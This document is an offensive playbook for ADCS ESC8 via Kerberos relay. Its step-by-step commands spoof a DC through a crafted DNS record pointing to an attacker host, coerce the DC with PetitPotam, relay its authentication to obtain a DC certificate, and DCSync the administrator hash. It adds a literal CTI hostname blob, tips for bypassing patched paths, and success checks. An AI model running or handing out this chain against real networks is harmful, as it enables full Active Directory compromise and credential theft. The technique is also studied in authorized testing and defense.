# ADCS ESC8 — Kerberos Relay Self-Bypass via CTI DNS Spoof

## When this applies

- ADCS Enterprise CA with **Web Enrollment Enabled** + Request Disposition `Issue` (`certipy find -vulnerable` flags `ESC8`).
- Domain has **NTLM disabled** (or `EnforceChannelBinding=2`/`EPA` blocks classic NTLM-relay ESC8).
- Foothold: any authenticated user able to write DNS records (default `Authenticated Users` create-child on `MicrosoftDNS`) and trigger MS-EFSRPC against the DC.
- Goal: relay the DC's machine-account Kerberos auth to its own ADCS web enrollment → DC certificate → DCSync.

## Technique

Classic ESC8 via NTLM relay is blocked when NTLM is disabled or EPA is enforced. The Kerberos variant abuses a serialized **CREDENTIAL_TARGET_INFORMATION (CTI)** structure encoded as a DNS hostname:

```
<MACHINE-NETBIOS><base64-CTI-blob>
```

When the coerced server resolves this name, it parses the CTI blob, computes the SPN for **its own** machine account (`cifs/<DC>$`), but opens the TCP/445 socket to the IP the DNS A record actually points at — the attacker. The attacker's relay receives an AP-REQ that is valid for the DC's own SMB SPN and forwards it to the DC's HTTP web-enrollment service, where the cross-protocol SPN check is bypassed.

## Steps

```bash
# 0. Pre-reqs: get a TGT for the low-priv user, NTLM is disabled so use -k everywhere.
getTGT.py -dc-ip <DC_IP> '<DOMAIN>/<USER>:<PASS>'
export KRB5CCNAME=<USER>.ccache

# 1. Add a malicious A record. Name = <DC_NETBIOS> + serialized empty CTI (~52 chars).
#    Tested literal value used in the wild: "<DC_NETBIOS>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA"
SPECIAL="<DC_NETBIOS>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA"
bloodyAD --host <DC_FQDN> --dc-ip <DC_IP> -d <DOMAIN> -k --kerberos \
  add dnsRecord "$SPECIAL" <ATTACKER_IP>
# Wait ~3-5 min for AD-DNS to reload; verify with: dig +short @<DC_IP> $SPECIAL.<DOMAIN>

# 2. Start the relay (listens on TCP/445 — needs root on the attacker host).
sudo certipy relay -target 'http://<DC_FQDN>/' \
  -template DomainController -ca <CA_NAME> -interface <ATTACKER_IP>

# 3. Coerce the DC. coerce_plus reaches the EfsRpcAddUsersToFile variant that
#    works for low-priv authenticated users (classic EfsRpcOpenFileRaw is admin-only).
nxc smb <DC_FQDN> -u <USER> -p <PASS> -k -M coerce_plus \
  -o LISTENER="$SPECIAL" METHOD=PetitPotam

# 4. Relay logs "Got certificate with DNS Host Name '<DC_FQDN>'" and writes <dc>.pfx.

# 5. Authenticate as DC$, then DCSync.
certipy auth -pfx <dc>.pfx -dc-ip <DC_IP>           # → <dc>.ccache + DC$ NT hash
KRB5CCNAME=<dc>.ccache secretsdump.py -k -no-pass \
  '<DOMAIN>/<DC_NETBIOS>$@<DC_FQDN>' -dc-ip <DC_IP> -just-dc-user administrator
```

## Verifying success

- `certipy find -vulnerable` lists the CA with `ESC8` and `Web Enrollment: Enabled`.
- `dig @<DC_IP> $SPECIAL.<DOMAIN>` returns `<ATTACKER_IP>` (DNS reload propagated).
- Relay log shows `(SMB): Received connection from <DC_IP>` followed by `Certificate issued with request ID …` and `Got certificate with DNS Host Name '<DC_FQDN>'`.
- `certipy auth -pfx <dc>.pfx` prints `Got hash for '<dc>$@<DOMAIN>'`.

## Common pitfalls

- **Wrong CTI hostname.** The serialized blob must encode the target's NetBIOS name. Generic placeholder names (`attacker`, `evil`) fail because the parsed SPN won't match the DC. Reuse the literal `<NETBIOS>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA` template and substitute the real NetBIOS prefix.
- **DNS not propagated.** Records added via LDAP take one DNS-reload cycle (~3–5 min) before the DC's resolver returns the new A record. Coercing earlier produces `BAD_NETPATH`.
- **Privileged port on attacker.** TCP/445 inbound is required. macOS without root cannot bind, and rootless Linux likewise. Either run on a host with sudo or `iptables`/`pf` redirect from a high port.
- **Wrong tun interface for tcpdump.** Verify with `ifconfig | grep -B1 <ATTACKER_IP>` before binding `-i utunN`.
- **PetitPotam classic methods (`EfsRpcOpenFileRaw`) return `rpc_s_access_denied`** on patched DCs — that is the patched, admin-only path. `coerce_plus` walks all MS-EFSRPC opnums and finds `EfsRpcAddUsersToFile`, which a low-priv user can still invoke.
- **`certipy 4.x` works for the SMB→HTTP relay**; the `5.x` line moves to Python 3.12 but uses the same impacket `SMBRelayServer` underneath.

## Tools

- bloodyAD (DNS record add over Kerberos)
- certipy / certipy-ad (`relay`, `auth`, `find`)
- netexec (`coerce_plus` module)
- impacket (`getTGT.py`, `secretsdump.py`, `wmiexec.py`)
